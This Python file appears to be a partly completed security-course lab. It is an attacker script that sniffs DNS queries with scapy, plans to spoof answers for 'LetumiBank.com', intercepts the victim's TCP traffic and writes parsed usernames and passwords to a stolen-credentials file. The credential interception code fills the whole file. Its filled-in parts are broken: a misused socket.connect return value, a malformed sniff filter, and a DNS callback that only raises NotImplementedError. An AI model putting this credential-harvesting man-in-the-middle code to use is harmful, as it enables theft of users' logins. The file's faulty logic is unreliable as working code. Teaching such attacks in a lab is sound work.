import os
import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "LetumiBank.com"


def resolve_hostname(hostname):
    # IP address of HOSTNAME. Used to forward tcp connection.
    # Normally obtained via DNS lookup.
    return "127.1.1.1"


def log_credentials(username, password):
    # Write stolen credentials out to file.
    # Do not change this.
    with open("lib/StolenCreds.txt", "wb") as fd:
        fd.write(str.encode("Stolen credentials: username=" +
                 username + " password=" + password))


def check_credentials(client_data):
    # TODO: Take a block of client data and search for username/password credentials.
    # If found, log the credentials to the system by calling log_credentials().
    if b'username' in client_data and b'password' in client_data:
        log_credentials(client_data.split(b'username=')[1].split(b'\n')[0],
                        client_data.split(b'password=')[1].split(b'\n')[0])


def handle_tcp_forwarding(client_socket, client_ip, hostname):
    # Continuously intercept new connections from the client
    # and initiate a connection with the host in order to forward data

    while True:

        # TODO: accept a new connection from the client on client_socket and
        # create a new socket to connect to the actual host associated with hostname.
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn = sock.connect((hostname, 80))

        # TODO: read data from client socket, check for credentials, and forward along to host socket.
        # Check for POST to '/post_logout' and exit after that request has completed.
        data = client_socket.recv(4096)
        check_credentials(data)
        conn.send(data)
        conn.close()


def dns_callback(packet, extra_args):
    # TODO: Write callback function for handling DNS packets.
    # Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.

    raise NotImplementedError


def sniff_and_spoof(source_ip):
    # TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
    # This socket will be used to accept connections from victimized clients.
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((source_ip, WEB_PORT))
    sock.listen(5)

    # TODO: sniff for DNS packets on the network. Make sure to pass source_ip
    # and the socket you created as extra callback arguments.
    sniff(filter=f"udp and port 53 src.ip {source_ip}", prn=dns_callback, store=0,
          lfilter=lambda p: p.haslayer(
              DNSQR) and p[DNSQR].qname == HOSTNAME,
          count=0, stop_filter=lambda p: p.haslayer(DNSRR),
          iface="lo")


def main():
    parser = argparse.ArgumentParser(
        description='Attacker who spoofs dns packet and hijacks connection')
    parser.add_argument('--source_ip', nargs='?', const=1,
                        default="127.0.0.3", help='ip of the attacker')
    args = parser.parse_args()

    sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
    # Change working directory to script's dir.
    # Do not change this.
    abspath = os.path.abspath(__file__)
    dirname = os.path.dirname(abspath)
    os.chdir(dirname)
    main()
